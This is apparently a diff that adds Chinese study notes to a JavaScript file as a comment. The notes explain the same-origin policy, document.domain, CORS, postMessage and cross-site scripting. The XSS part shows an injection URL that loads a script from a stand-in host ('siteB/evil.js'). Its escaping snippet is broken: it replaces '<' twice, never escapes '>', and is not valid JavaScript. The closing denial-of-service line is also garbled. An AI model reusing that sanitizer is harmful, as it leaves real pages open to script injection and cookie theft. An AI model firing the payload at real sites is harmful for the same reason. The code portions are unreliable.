@@ -76,10 +76,55 @@
     由于IE不支持canvas元素
     因此可以引入 https：//code.google.com/explorecanvas
 
+    同源策略 是JS代码能够操作那些Web内容的一条完整的安全限制。
+    当Web页面使用多个iframe元素或者打开其他浏览器窗口的时候，这一策略通常就发挥作用
+    需要注意的是
+    文档来源包含协议、主机以及载入文档的URL端口，
+    这三者有一点不同那么就代表着不是同源，就是说不同端口，不同Web服务器
+    Http协议或者Https协议载入的文档都具有不同的来源。
+    脚本本身的来源和同源策略不相关，相关的是脚本所嵌入的文档的来源。
+    同源策略应用于窗口中所有对象的大多数属性，尤其是对Document对象的几乎所有属性而言。
+    范式包含另一个服务器中文档的窗口或者窗体都是同源策略使用的范围。
 
+    但是某些情况下，同源策略显得过于严格，下面介绍一些不严格的同源策略
+    第一种情况
+        从多域名站点，比如，xxx.example.com 其中xx代表多个站点，我们可以认为他们来自于同一个站点
+    因此可以使用Document对象的domain属性，在默认情况下。属性domain粗放的是载入文档的服务器的主机名。
+    一般来说以设置为example.com的形式，这样就可以访问多级域名了。
+    如果两个窗口（或窗体包含的脚本）把domain设置成了相同的值，那么这两个窗口就不再受同源策略的约束，
+    他们可以互相读取对方的属性。
+    第二种情况
+        跨域资源共享（Cross-Origin Resource Sharing 参见http://www.w3.org/TR/cors）,这个标准草案
+    用新的“Origin”请求头和新的Access-Control-Allow-Origin响应头来扩展HTTP，它允许服务器用头信息
+    显式地列出源，或使用通配符来匹配所有的源并允许由任何地址请求文件。
+    第三种情况
+        跨文档消息（cross-document messaging）,允许来自一个文档的脚本可以传递文本消息到另一个文档的 脚本，
+    而不管脚本的来源是否相同。
+        调用Window对象上的postMessage方法，可以异步传递消息事件（可以用onmessage事件句处理程序函数来处理它）
+    到窗口的文档里。一个文档里的脚本还是不能调用在其他文档的方法和读取信息，但他们可以用这种消息传递技术来实现安全的通信
+    */
+    /*
+    跨站脚本（Cross-site scripting）或者叫做XSS
+    代表的就是攻击者想目标Web站点注入HTML标签或者脚本.
+    如果Web页面动态地产生文档内容，并且这些文档内容是基于用户提交的数据的，而并没有通过从中移除任何嵌入的HTML标签来
+    “消毒”的话这个Web页面就很容易受到跨站脚本攻击。
+    比如我们的URL被劫持，之后使用的URL被修改后，添加了相应的注入脚本的功能，
+    比如原始的访问页面为
+    http://www.example.com/greet.html?David
+    被修改为
+    http://stitA/greet.html?name = %3Cscript src= siteB/evil.js%3E%3C/script%3E
+    这样他就嵌入到了当前的站点A的页面中，之后，就可能破坏这页面，或者读取站点A存储的cookie
+    而消除这种XSS攻击的方式是，在使用任何不可信的数据来动态的创建文档内容之前，从中移除HTML标签。
+    例如我们可以移除script标签
+    name = name.replace(/</g,"&lt;">).replace(/</g,"&gt;">);
+    而IE8中可以使用toStaticHTML方法，移除script标签
+    而在HTML5中，为iframe元素定义了一个sandbox属性。它在实现之后，允许显示不可信的内容，并自动禁用脚本
+    */
+    /*
+    拒绝服务攻击
+    DOS使用同源策略和其他安全限制可以很好地预防而已代码毁坏数据或者侵犯隐私。
 
     */
-
     function hello() {
         var msg = 'hello world';
         document.open()
